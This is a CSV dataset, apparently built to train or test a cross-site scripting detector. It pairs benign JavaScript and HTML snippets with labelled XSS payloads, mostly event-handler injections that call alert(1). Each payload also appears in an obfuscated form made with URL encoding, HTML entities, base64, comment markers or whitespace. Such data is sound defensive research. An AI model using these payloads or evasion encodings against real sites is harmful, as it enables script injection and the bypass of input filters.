sample_id,label,payload_original,payload_obfuscated,generator,recipe
825,1,"<style>@keyframes slidein {}</style><td style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></td>","<style>@keyframes sli/*OBF*/dein {}</style><td style=""animation-du/*OBF*/ration:1s;animation-name:slidein;animatio/*OBF*/n-iteration-count:2"" onanimationiteration=""alert(1)""></td>",tool_baseline,comment_marker
826,0,"return true; } tests[name].t( parsed, options[name] === undefined ? defaults[name] : options[name] );","return true; } tests[name].t( parsed, options[name] === undefined ? defaults[name] : options[name] );",tool_baseline,none
827,0,_setupeventhandlers() { this._handlerangechangebound = this._handlerangechange.bind(this); this._handlerangemousedowntouchstartbound = this._handlerangemousedowntouchstart.bind(this);,_setupeventhandlers() { this._handlerangechangebound = this._handlerangechange.bind(this); this._handlerangemousedowntouchstartbound = this._handlerangemousedowntouchstart.bind(this);,tool_baseline,none
828,0,var diff = this.center % this.count - n,var diff = this.center % this.count - n,tool_baseline,none
829,0,preventscrolling: true }; class sidenav extends component {,preventscrolling: true }; class sidenav extends component {,tool_baseline,none
830,0,const isinthedom = (shadowroot || this._element.ownerdocument.documentelement).contains(this._element),const isinthedom = (shadowroot || this._element.ownerdocument.documentelement).contains(this._element),tool_baseline,none
831,0,$(this.placeholder).after(this.el).remove(); this.$el.removeattr('style'); },$(this.placeholder).after(this.el).remove(); this.$el.removeattr('style'); },tool_baseline,none
832,0,_setupclasses() { if (this.options.edge === 'right') { this.el.classlist.add('right-aligned');,_setupclasses() { if (this.options.edge === 'right') { this.el.classlist.add('right-aligned');,tool_baseline,none
833,0,import { definejqueryplugin } from './util/index.js' const name = 'popover' const selector_title = '.popover-header',import { definejqueryplugin } from './util/index.js' const name = 'popover' const selector_title = '.popover-header',tool_baseline,none
834,0,_this62.$el.append(_this62.$indicators); } _this62.count = _this62.images.length;,_this62.$el.append(_this62.$indicators); } _this62.count = _this62.images.length;,tool_baseline,none
835,0,<dt>breadth of commonsense knowledge </dt>,<dt>breadth of commonsense knowledge </dt>,tool_baseline,none
836,1,<element id=x tabindex=1 onfocusin=alert(1)></element>,%3Celement%20id%3Dx%20tabindex%3D1%20onfocusin%3Dalert%281%29%3E%3C%2Felement%3E,tool_baseline,urlencode
837,0,"value: function showview(view, delay) {","value: function showview(view, delay) {",tool_baseline,none
838,0,"} this.dropdown = m.dropdown.init(this.input, dropdownoptions); }","} this.dropdown = m.dropdown.init(this.input, dropdownoptions); }",tool_baseline,none
839,1,"<progress onpaste=""alert(1)"" contenteditable>test</progress>",%3Cprogress%20onpaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fprogress%3E,tool_baseline,urlencode
840,0,if (this.value.length !== 0 || $(this).attr('placeholder') !== null) { $(this).siblings('label').addclass('active'); },if (this.value.length !== 0 || $(this).attr('placeholder') !== null) { $(this).siblings('label').addclass('active'); },tool_baseline,none
841,1,"<meter onkeyup=""alert(1)"" contenteditable>test</meter>",%3Cmeter%20onkeyup%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fmeter%3E,tool_baseline,urlencode
842,0,"}, { key: ""_updateampmview"", value: function _updateampmview() {","}, { key: ""_updateampmview"", value: function _updateampmview() {",tool_baseline,none
843,0,let overlayoffset = this.$overlay[0].getboundingclientrect(),let overlayoffset = this.$overlay[0].getboundingclientrect(),tool_baseline,none
844,0,"relatedtarget: this._element }; const showevent = eventhandler.trigger(this._element, event_show$5, relatedtarget);","relatedtarget: this._element }; const showevent = eventhandler.trigger(this._element, event_show$5, relatedtarget);",tool_baseline,none
845,0,"container.addeventlistener('touchstart', toast._ondragstart)","container.addeventlistener('touchstart', toast._ondragstart)",tool_baseline,none
846,0,} this.istouchmoving = false; },} this.istouchmoving = false; },tool_baseline,none
847,1,<noframes onpointerup=alert(1)>xss</noframes>,<noframes onpointerup=alert(  1)>xss</noframes>,tool_baseline,whitespace_noise
848,0,} } _handletabclick(e) {,} } _handletabclick(e) {,tool_baseline,none
849,1,<dir onfocusout=alert(1) tabindex=1 id=x></dir><input autofocus>,%3Cdir%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Fdir%3E%3Cinput%20autofocus%3E,tool_baseline,urlencode
850,1,"<noembed onmousemove=""alert(1)"">test</noembed>",&lt;noembed onmousemove=&quot;alert(1)&quot;&gt;test&lt;/noembed&gt;,tool_baseline,html_entities
851,1,<noframes id=x tabindex=1 ondeactivate=alert(1)></noframes><input id=y autofocus>,<noframes id= x tabindex=1 ondeactivate=alert( 1)></noframes><input id=y autofocus>  ,tool_baseline,whitespace_noise
852,1,"<style>:target {color: red;}</style><menu id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></menu>",&lt;style&gt;:target {color: red;}&lt;/style&gt;&lt;menu id=x style=&quot;transition:color 10s&quot; ontransitioncancel=alert(1)&gt;&lt;/menu&gt;,tool_baseline,html_entities
853,1,<plaintext onpointerenter=alert(1)>xss</plaintext>,<plaintext onpointerenter=alert(1)>xss</plaintext>,tool_baseline,comment_marker
854,0,if (this.moved && x === this.dx && y === this.dy) {,if (this.moved && x === this.dx && y === this.dy) {,tool_baseline,none
855,1,"<i onclick=""alert(1)"">test</i>","<i onclick=""alert(1)"">test</i>",tool_baseline,whitespace_noise
856,0,}; m.guid = function () { function s4() {,}; m.guid = function () { function s4() {,tool_baseline,none
857,1,"<style>@keyframes x{}</style><ins style=""animation-name:x"" onanimationend=""alert(1)""></ins>","<style>@keyframes x{}</style><ins st/*OBF*/yle=""animation-n/*OBF*/ame:x"" onanimationend=""alert(1)""></ins>",tool_baseline,comment_marker
858,0,"<li id=""cite_note-380""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-380"">^ </a> </b>","<li id=""cite_note-380""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-380"">^ </a> </b>",tool_baseline,none
859,0,if (this.percentopen > 0.2) {,if (this.percentopen > 0.2) {,tool_baseline,none
860,0,} _handletriggerkeydown(e) { if ((e.which === m.keys.arrow_down || e.which === m.keys.enter) && !this.isopen) {,} _handletriggerkeydown(e) { if ((e.which === m.keys.arrow_down || e.which === m.keys.enter) && !this.isopen) {,tool_baseline,none
861,0,let direction = e.which === m.keys.arrow_down ? 1 : -1,let direction = e.which === m.keys.arrow_down ? 1 : -1,tool_baseline,none
862,1,"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""alert(1)""></p>",%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cp%20style%3D%22animation-name%3Ax%22%20onanimationend%3D%22alert%281%29%22%3E%3C%2Fp%3E,tool_baseline,urlencode
863,0,const parentscrolltop = (this._rootelement || document.documentelement).scrolltop,const parentscrolltop = (this._rootelement || document.documentelement).scrolltop,tool_baseline,none
864,0,if (selector.cash && selector !== win) { return selector; },if (selector.cash && selector !== win) { return selector; },tool_baseline,none
865,0,"return; } eventhandler.one(target, event_hidden, () => {","return; } eventhandler.one(target, event_hidden, () => {",tool_baseline,none
866,1,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>",%3Cstyle%3E%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%3C%2Fstyle%3E%3Ca%20id%3Dx%20style%3D%22position%3Aabsolute%3B%22%20onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fa%3E,tool_baseline,urlencode
867,1,"<style>:target {color: red;}</style><strong id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></strong>",&lt;style&gt;:target {color: red;}&lt;/style&gt;&lt;strong id=x style=&quot;transition:color 10s&quot; ontransitioncancel=alert(1)&gt;&lt;/strong&gt;,tool_baseline,html_entities
868,1,"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onanimationend=""alert(1)""></noframes>",&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;noframes style=&quot;animation-name:x&quot; onanimationend=&quot;alert(1)&quot;&gt;&lt;/noframes&gt;,tool_baseline,html_entities
869,1,"<hr onclick=""alert(1)"">test</hr>",%3Chr%20onclick%3D%22alert%281%29%22%3Etest%3C%2Fhr%3E,tool_baseline,urlencode
870,0,that.xsteps[i] = frompercentage([,that.xsteps[i] = frompercentage([,tool_baseline,none
871,1,<base id=x tabindex=1 onactivate=alert(1)></base>,<base id=  x tabindex=1 onactivate=alert(1)  ></  base>,tool_baseline,whitespace_noise
872,1,<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>,<aside id=x tabindex=1 onbeforeactivate=alert(1)> </aside>,tool_baseline,whitespace_noise
873,0,"if (target.classlist.contains(class_name_dropdown_item)) { selectorengine.findone(selector_dropdown_toggle, target.closest(selector_dropdown)).classlist.add(class_name_active); return;","if (target.classlist.contains(class_name_dropdown_item)) { selectorengine.findone(selector_dropdown_toggle, target.closest(selector_dropdown)).classlist.add(class_name_active); return;",tool_baseline,none
874,0,"_setupmodal() { this.modal = m.modal.init(this.modalel, { onopenstart: this.options.onopenstart,","_setupmodal() { this.modal = m.modal.init(this.modalel, { onopenstart: this.options.onopenstart,",tool_baseline,none
875,0,if (allowedattributelist.includes(attributename)) {,if (allowedattributelist.includes(attributename)) {,tool_baseline,none
876,0,"$(document).on('keyup', radio_checkbox, function (e) { if (e.which === m.keys.tab) { $(this).addclass('tabbed');","$(document).on('keyup', radio_checkbox, function (e) { if (e.which === m.keys.tab) { $(this).addclass('tabbed');",tool_baseline,none
877,0,return this._resolvepossiblefunction(this._config.title) || this._element.getattribute('data-bs-original-title'); } _initializeondelegatedtarget(event) {,return this._resolvepossiblefunction(this._config.title) || this._element.getattribute('data-bs-original-title'); } _initializeondelegatedtarget(event) {,tool_baseline,none
878,0,"let index = sidenav._sidenavs.indexof(this); if (index >= 0) { sidenav._sidenavs.splice(index, 1);","let index = sidenav._sidenavs.indexof(this); if (index >= 0) { sidenav._sidenavs.splice(index, 1);",tool_baseline,none
879,0,".replace(/__app_id__/g, config.algolia.app_id) } return code",".replace(/__app_id__/g, config.algolia.app_id) } return code",tool_baseline,none
880,0,"element.removeeventlistener(typeevent, fn, boolean(delegationselector)) delete events[typeevent][fn.uidevent] }","element.removeeventlistener(typeevent, fn, boolean(delegationselector)) delete events[typeevent][fn.uidevent] }",tool_baseline,none
881,0,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/telnetconsole.html"">telnet console</a></li>","<li class=""toctree-l1""><a class=""reference internal"" href=""topics/telnetconsole.html"">telnet console</a></li>",tool_baseline,none
882,0,"each(eventcache, function (event) { node.removeeventlistener(eventname, event); });","each(eventcache, function (event) { node.removeeventlistener(eventname, event); });",tool_baseline,none
883,0,"href: 'http://materializecss.com/chips.html', title: 'chips', body: 'chips can be used to represent small blocks of information. they are most commonly used either for contacts or for tags.'","href: 'http://materializecss.com/chips.html', title: 'chips', body: 'chips can be used to represent small blocks of information. they are most commonly used either for contacts or for tags.'",tool_baseline,none
884,0,this._valuedict[key] = obj; } _removedropdown() {,this._valuedict[key] = obj; } _removedropdown() {,tool_baseline,none
885,1,"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationstart=""alert(1)""></blockquote>",%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cblockquote%20style%3D%22animation-name%3Ax%22%20onanimationstart%3D%22alert%281%29%22%3E%3C%2Fblockquote%3E,tool_baseline,urlencode
886,1,"<audio id=x controls onfocus=alert(1) id=x><source src=""validaudio.wav""></audio>",&lt;audio id=x controls onfocus=alert(1) id=x&gt;&lt;source src=&quot;validaudio.wav&quot;&gt;&lt;/audio&gt;,tool_baseline,html_entities
887,0,"<h2><span class=""mw-headline"" id=""further_reading"">further reading","<h2><span class=""mw-headline"" id=""further_reading"">further reading",tool_baseline,none
888,0,let clickedindex = $(e.target),let clickedindex = $(e.target),tool_baseline,none
889,0,"_this11.options.onopenend.call(_this11, _this11.el); } }","_this11.options.onopenend.call(_this11, _this11.el); } }",tool_baseline,none
890,0,"methods.push([eventname, method])","methods.push([eventname, method])",tool_baseline,none
891,0,parsehtml(selector) :,parsehtml(selector) :,tool_baseline,none
892,0,} else { $autocompleteoption.append('<span>' + entry.key + '</span>'); },} else { $autocompleteoption.append('<span>' + entry.key + '</span>'); },tool_baseline,none
893,0,if (scrollspy._visibleelements[0]) { $(this.options.getactiveelement(scrollspy._visibleelements[0].attr('id'))).addclass( this.options.activeclass,if (scrollspy._visibleelements[0]) { $(this.options.getactiveelement(scrollspy._visibleelements[0].attr('id'))).addclass( this.options.activeclass,tool_baseline,none
894,0,".siblings('label, .prefix')",".siblings('label, .prefix')",tool_baseline,none
895,1,"<s onmouseout=""alert(1)"">test</s>",&lt;s onmouseout=&quot;alert(1)&quot;&gt;test&lt;/s&gt;,tool_baseline,html_entities
896,0,let jqueryevent = null; let bubbles = true; let nativedispatch = true;,let jqueryevent = null; let bubbles = true; let nativedispatch = true;,tool_baseline,none
897,1,"<strong draggable=""true"" ondragend=""alert(1)"">test</strong>",PHN0cm9uZyBkcmFnZ2FibGU9InRydWUiIG9uZHJhZ2VuZD0iYWxlcnQoMSkiPnRlc3Q8L3N0cm9uZz4=,tool_baseline,base64
898,0,show(relatedtarget) { if (this._isshown) { return,show(relatedtarget) { if (this._isshown) { return,tool_baseline,none
899,0,} _isshown() { return this.tip && this.tip.classlist.contains(class_name_show$2);,} _isshown() { return this.tip && this.tip.classlist.contains(class_name_show$2);,tool_baseline,none
900,0,"var doc = document, win = window, arrayproto = array.prototype, slice = arrayproto.slice, filter = arrayproto.filter, push = arrayproto.push; var noop = function () {}, isfunction = function (item) { return typeof item === typeof noop && item.call;","var doc = document, win = window, arrayproto = array.prototype, slice = arrayproto.slice, filter = arrayproto.filter, push = arrayproto.push; var noop = function () {}, isfunction = function (item) { return typeof item === typeof noop && item.call;",tool_baseline,none
901,1,"<script/src=""https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.15/lodash.min.js""></script>",%3Cscript%2Fsrc%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Flodash.js%2F4.17.15%2Flodash.min.js%22%3E%3C%2Fscript%3E,tool_baseline,urlencode
902,1,"<details onmouseout=""alert(1)"">test</details>","< details onmouseout=""alert(1)"">  test</details>",tool_baseline,whitespace_noise
903,1,"<* onclick=""alert(1)"" style=display:block>test</*>",PCogb25jbGljaz0iYWxlcnQoMSkiIHN0eWxlPWRpc3BsYXk6YmxvY2s+dGVzdDwvKj4=,tool_baseline,base64
904,1,<script onpointerup=alert(1)>xss</script>,PHNjcmlwdCBvbnBvaW50ZXJ1cD1hbGVydCgxKT54c3M8L3NjcmlwdD4=,tool_baseline,base64
905,0,"document.body.removeeventlistener('click', this._handletriggerclick); } this.$overlay[0].removeeventlistener('click', this._handleoverlayclickbound);","document.body.removeeventlistener('click', this._handletriggerclick); } this.$overlay[0].removeeventlistener('click', this._handleoverlayclickbound);",tool_baseline,none
906,0,"i = 0, length; if (isstring(selector)) {","i = 0, length; if (isstring(selector)) {",tool_baseline,none
907,0,"}, { key: ""_comparedates"", value: function _comparedates(a, b) {","}, { key: ""_comparedates"", value: function _comparedates(a, b) {",tool_baseline,none
